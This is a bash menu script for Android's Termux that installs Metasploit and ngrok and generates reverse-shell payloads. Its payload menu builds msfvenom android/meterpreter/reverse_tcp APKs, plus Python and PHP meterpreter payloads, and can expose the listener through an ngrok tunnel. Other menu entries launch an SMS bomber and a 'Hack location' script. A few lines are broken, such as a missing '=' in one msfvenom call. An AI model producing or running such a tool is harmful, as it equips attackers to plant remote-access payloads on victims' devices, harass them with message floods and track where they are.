#!/bin/bash
#trap 'ex'
trap ex SIGINT
trap ex SIGQUIT


banner() {
	cd $PREFIX/bin
	./toilet -f ../share/figlet/font -F ../share/toilet/metal Menu
	}
	ngcheck () {
		cd $PREFIX/bin
		if [ -e ngrok ];then
		printf "\n\033[1;92m [√] Installed ngrok \n\n"
		else
		printf "\n\033[1;92m [+] Installing ngrok..\n"
		cd $PREFIX/bin
		./wget https://github.com/rooted-cyber/Ngrok-All-Version/raw/main/ngrok-2.2.9-linux-arm64.zip
		./unzip ngrok*
		./cp ngrok 
		chmod 700 $PREFIX/bin/ngrok
		fi
		
		}
	pcheck () {
		rcheck
		bin
		if [ -e toilet ];then
		printf "\n\033[1;92m [√] Installed toilet. \n"
		else
		printf "\n\033[1;92m [+] Installing toilet..\n"
		cd ~
		fix
		apt download toilet
		dpkg -i toilet*
		fi
		bin
		if [ -e figlet ];then
		printf "\n\033[1;92m [√] Installed figlet. \n"
		else
		printf "\n\033[1;92m [+] Installing figlet..\n"
		cd ~
		fix
		apt download figlet
		dpkg -i figlet*
		fi
		bin
		if [ -e wget ];then
		printf "\n\033[1;92m [√] Installed wget. \n"
		else
		printf "\n\033[1;92m [+] Installing wget..\n"
		cd ~
		fix
		apt download wget
		dpkg -i wget*
		fi
		clear
		}
	ex() {
		printf "\n\033[1;91m Enter Valid key !!!\n\n"
		}
		ch() {
			if [ -e $PREFIX/bin/msfvenom ];then
			printf "\033[1;92m Installed\n\n"
			sleep 1
			msfconsole
			else
			printf "\033[1;91m Not Installed\n\n"
			fi
			}
			new() {
				random
				printf "\n\n Installing Metasploit\n"
				curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz
gunzip metasploit_5.0.65-1_all.deb.gz
dpkg -i metasploit_5.0.65-1_all.deb
apt -f install
pkg install metasploit
apt --fix-broken install
dpkg --configure -a
msfconsole
}
old () {
	random
	printf "\n\n Installing Metasploit \n\n"
	pkg install unstable-repo
	pkg install metasploit
	msfconsole
	}
	
		m-install() {
			clear
			printf "\n\n\033[1;96m Checking Installation..."
			sleep 1
			ch
			case `getprop ro.build.version.sdk` in
			21|22|23)new ;;
			*)old ;;
			esac
			}
			int() {
				cd ~
				wget https://raw.githubusercontent.com/rooted-cyber/TI-Script/master/requirement.txt > /dev/null 2>&1
				cd ~
				if [ -e requirement.txt ];then
				printf "\033[1;96m Internet is connected"
				rm -f *txt > /dev/null 2>&1
				else
				printf "\033[1;91m Not connected to internet !!!"
				fi
				}
				phone () {
					clear
				printf "\n\n\033[1;92m Checking Internet .... :\033[1;97m "
				int
				printf "\n\n\033[1;92m Checking Your ip :\033[1;97m "
				ip="$(curl -s -N ifconfig.me)"
				printf "\033[1;96m Your ip :\033[1;97m $ip"
				printf "\n\n\033[1;93m Checking your phone information........."
				kernal="$(uname -r)"
				ver="$(getprop ro.build.version.release)"
				sdk="$(getprop ro.build.version.sdk)"
				arch="$(getprop ro.product.cpu.abilist)"
				cpu="$(getprop ro.board.platform)"
				phone2="$(getprop ro.product.brand)"
				phone="$(getprop ro.product.name)"
				time="$(date +"%r")"
				date="$(date +"%F")"
				cd $PREFIX/var/lib/dpkg > /dev/null 2>&1
				packk="$(grep -c -e "Package" status)"
				#battery="$(termux-battery-status|grep -e "percentage")"
				#locate="$(termux-location|grep -e "lat" 	-e "long")"
				printf "\n\n\033[1;92m Your phone name :\033[0m $phone2\n"
				printf "\033[1;92m Your phone name & modal :\033[0m $phone\n"
				printf "\033[1;92m Android Version :\033[0m Android version $ver\n"
				printf "\033[1;92m CPU :\033[0m $cpu\n"
				printf "\033[1;92m Architecture :\033[0m $arch\n"
				printf "\033[1;92m SDK :\033[0m SDK$sdk\n"
				printf "\033[1;92m Kernal :\033[0m $kernal\n"
				printf "\033[1;92m Packages :\033[0m $packk Packages installed\n"
				printf "\033[1;92m Time :\033[1;97m $time\n"
				printf "\033[1;92m Date :\033[1;97m $date\n"
				#printf "\033[1;92m Battery :\033[1;97m $battery\n"
				#printf "\033[1;92m Your location :\033[1;97m $locate\n"
				}
				check() {
		if [ -e $PREFIX/bin/msfvenom ];then
		echo
		else
		printf "\n\n\033[1;91m [×]\033[1;93m First install Metasploit !!!\n\n"
		exit
		fi
		}
		fcheck() {
			if [ -e /sdcard/Payload ];then
			echo
			else
			cd /sdcard
			cd $PREFIX/bin
			./termux-setup-storage
			cd $PREFIX/bin
			./mkdir /sdcard/Payload
			fi
			}
			normal () {
				echo
				random
				echo -e -n "Enter LHOST : \033[0m"
				read bb
				if [ $bb ];then
				echo
				sleep 1
				random
				echo -e -n "Enter LPORT : \033[0m"
				fi
				read cc
				if [ $cc ];then
				echo
				random
				printf "Plase wait ..\n"
				cd $PREFIX/bin
				./msfvenom -p android/meterpreter/reverse_tcp LHOST=$bb LPORT=$cc R > /sdcard/Payload/Payload.apk
				random
				printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
				cd $PREFIX/bin
	./toilet -f ../share/figlet/font -F ../share/toilet/metal  Exiting
				fi
				}
				ng() {
					pcheck
					ngcheck
					printf "\033[1;93m[+]\033[1;92m Starting Ngrok Server...\n"
					killall -2 ngrok > /dev/null 2>&1
					./ngrok tcp 4444 > /dev/null 2>&1 &
					sleep 12
					cd $PREFIX/bin
					link=$(./curl -s -N http://127.0.0.1:4040/status | ./grep -o "tcp://[0-9]*\.tcp\.ngrok\.io:[0-9]*")
					if [ -z $link ];then
					printf "\n\033[1;91m[×]\033[1;93m Try again !!!\n\n"
					echo
					#toilet -f font -F metal Exiting
					exit
					fi
					printf "\033[1;93m[+]\033[1;92m Your LHOST and LPORT : \033[1;93m$link\n\n"
					echo -e "\033[1;92m"
					echo -en " Enter above LHOST\033[0m "
					read ab
					if [ $ab ];then
					echo
					echo -en "\033[1;92m Enter above LPORT\033[0m "
					read bc
					fi
					if [ $bc ];then
					
					echo
					sleep 2
					printf "\033[1;92m Please wait .. Creating Your payload\n\n"
					cd $PREFIX/bin
					./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ab LPORT $bc R > /sdcard/Payload/Ngrok-Payload.apk
					fi
					random
					printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
					toilet -f font -F metal Exiting
					}
					py() {
	echo
	random
	echo -e -n "Enter LHOST \033[0m"
	read a
	if [ $a ];then
	echo
	random
	echo -e -n "Enter LPORT\033[0m "
	read b
	msfvenom -p python/meterpreter/reverse_tcp LHOST=$a LPORT=$b R > /sdcard/Payload/python-pyload.py
	random
	printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
	#toilet -f font -F metal Exiting
	fi
	}
	ph() {
	echo
	random
	echo -e -n "Enter LHOST \033[0m"
	read a
	if [ $a ];then
	echo
	random
	echo -e -n "Enter LPORT\033[0m "
	read b
	cd $PREFIX/bin
	./msfvenom -p php/meterpreter/reverse_tcp LHOST=$a LPORT=$b R > /sdcard/Payload/php.php
	random
	printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
	#toilet -f font -F metal Exiting
	cd $PREFIX/bin
	./toilet -f ../share/figlet/font -F ../share/toilet/metal Exiting
	fi
	}
		payload() {
				clear
				check
				fcheck
				toilet -f font -F metal Payload
				toilet -f font -F metal Menu
				printf "\n\033[1;92m[\033[0m1\033[1;92m]\033[1;93m Normal payload\n"
				printf "\033[1;92m[\033[0m2\033[1;92m]\033[1;93m python payload\n"
				printf "\033[1;92m[\033[0m3\033[1;92m]\033[1;93m php payload\n"
				printf "\033[1;92m[\033[0m4\033[1;92m]\033[1;93m Ngrok payload\n\n\n"
				
				echo -e -n "\033[1;93mPayload\033[1;96m ➤\033[0m "
				read f
				case $f in
				1)normal ;;
				2)py ;;
				3)ph ;;
				4)ng ;;
				*)payload ;;
				esac
				}
				bomb() {
					cd $PREFIX/bin
					./python ~/MBOMB-V2.bomb.py
					}
					location () {
						cd ~/I-Location
						./../../usr/bin/chmod 700 location.sh
						./location.sh
						}
	z-menu() {
		banner
		printf "\n\033[1;93m[\033[0m1\033[1;93m]\033[1;92m Your phone information\n"
		printf "\033[1;93m[\033[0m2\033[1;93m]\033[1;92m Unlimited sms bomber \n"
		printf "\033[1;93m[\033[0m3\033[1;93m]\033[1;92m Hack location\n"
		printf "\033[1;93m[\033[0m4\033[1;93m]\033[1;92m Install Metasploit\n"
		printf "\033[1;93m[\033[0m5\033[1;93m]\033[1;92m Create Payload\n"
		printf "\033[1;93m[\033[0m6\033[1;93m]\033[1;92m Home\n\n"
		
		echo -e -n "\033[1;93m Menu\033[0m ==>> "
		read a
		case $a in
		1) phone ;;
		2) bomb ;;
		3) location ;;
		4)m-install ;;
		5)payload ;;
		6)zsh ;;
		*)ex ;;
		esac
		}